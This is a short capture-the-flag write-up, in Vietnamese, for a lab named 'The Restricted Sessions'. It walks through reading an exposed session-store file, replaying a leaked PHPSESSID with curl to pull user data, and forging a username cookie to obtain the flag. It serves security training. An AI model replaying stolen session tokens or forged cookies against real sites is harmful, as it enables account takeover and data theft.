I. Lý thuyết<br>

II. lap: The Restricted Sessions<br>
1. chặn truy cập và lấy đc 1 đoạn code JS<br>

![image](https://github.com/user-attachments/assets/2b8207b2-1d00-4eba-8b0e-6c509cc07ceb)<br>

```
   <script type="text/javascript">

      if(document.cookie !== ''){
        $.post('getcurrentuserinfo.php',{
          'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
        },function(data){
          cu = data;
        });
      }
    </script>
```

2. đặt cookie là PHPSESSID -> Session not found in data/session_store.txt<br>

![image](https://github.com/user-attachments/assets/bba92cff-aa5c-46b7-bcfa-8fe409270a7c)<br>

3. gửi yêu cầu đến data/session_store.txt để lấy list session<br>

![image](https://github.com/user-attachments/assets/b71601ca-fa74-4acb-ab14-dce4b249476b)<br>

```
iuqwhe23eh23kej2hd2u3h2k23
11l3ztdo96ritoitf9fr092ru3
ksjdlaskjd23ljd2lkjdkasdlk
```

4. gửi cookie và session hợp lệ đến file: getcurrentuserinfo.php
```
curl --form "PHPSESSID=iuqwhe23eh23kej2hd2u3h2k23" http://wlemk873okkfwvy0km73p97aqzqwj6zq9oj9s6z9-web.cybertalentslabs.com/getcurrentuserinfo.php
{"name":"john","email":"john@example.com","session_id":"iuqwhe23eh23kej2hd2u3h2k23"}
```

5. gửi lại yêu cầu -> UserInfo Cookie don't have the username , Validation failed <br>

![image](https://github.com/user-attachments/assets/784c24d2-fde1-41e8-87ca-8c08b38c51c6)<br>

6. bổ sung username và gửi lại request -> Flag: sessionareawesomebutifitsecure<br>

![image](https://github.com/user-attachments/assets/1d330cd9-1230-4518-9742-1f1032bdb8ae)
